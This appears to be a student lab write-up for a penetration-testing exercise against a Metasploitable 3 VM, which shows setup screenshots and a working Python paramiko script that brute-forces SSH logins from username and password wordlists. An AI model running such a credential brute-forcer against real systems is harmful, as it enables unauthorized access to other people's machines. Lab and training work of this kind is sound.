# Phase1:
# Downloading and Importing Metasploitable 3 VM (the Victim environment):
![Screenshot 2025-04-26 194716](https://github.com/user-attachments/assets/6eb215a9-2c85-42b9-87cc-88133d73b8c1)

# Checking the connectivity between the attacker(kali) and the victim:
![Screenshot 2025-04-27 211734](https://github.com/user-attachments/assets/496e6b54-4a39-47a7-9e20-faae575623e2)
![Screenshot 2025-04-27 212646](https://github.com/user-attachments/assets/5e052f8c-2ace-4b61-b039-d71a933f0834)

# Setting up metasploit framework in the kali VM:
![Screenshot 2025-04-27 191041](https://github.com/user-attachments/assets/7015f966-f7bb-4857-9a44-9d6ca4e8ebaa)
 
# Task1.1: 
We choosed SSH service to compromise.

![Screenshot 2025-04-27 222648](https://github.com/user-attachments/assets/a77cc2c4-83fe-40f1-9f71-1d0a8cb5c31b)


# Task1.2: Custom script for compromising the SSH service :
import paramiko

#Target Information

target_ip = "192.168.8.36"

target_port = 22


#Files containing usernames and passwords

user_file_path = "user_file.txt"

pass_file_path = "pass_file.txt"


#Setup the SSH client

ssh_client = paramiko.SSHClient()

ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())


#Read usernames and passwords from files

with open(user_file_path, "r") as uf:

    usernames = [line.strip() for line in uf if line.strip()]
    

with open(pass_file_path, "r") as pf:

    passwords = [line.strip() for line in pf if line.strip()]
    

#Try all combinations

for username in usernames:

    for password in passwords:
    
        try:
        
            print(f"[*] Trying {username}:{password}")
            
            ssh_client.connect(hostname=target_ip, port=target_port, username=username, password=password, timeout=5)
            
            print(f"[+] Success! Credentials found: {username}:{password}")
            
            ssh_client.close()
            
            exit()
            
        except paramiko.AuthenticationException:
        
            print(f"[-] Failed login: {username}:{password}")
            
        except Exception as e:
        
            print(f"[!] Connection error: {e}")
            

print("[-] No valid credentials found.")


Proof of Concept:

![Screenshot 2025-04-27 223238](https://github.com/user-attachments/assets/2fd540b2-2eab-46cc-819f-dd568370a04a)

![Screenshot 2025-04-27 223258](https://github.com/user-attachments/assets/87715ffd-6527-40ba-8160-f0ba35fec694)

it tried all possible combinations we took screenshots for the commands and when it found the correct credentials


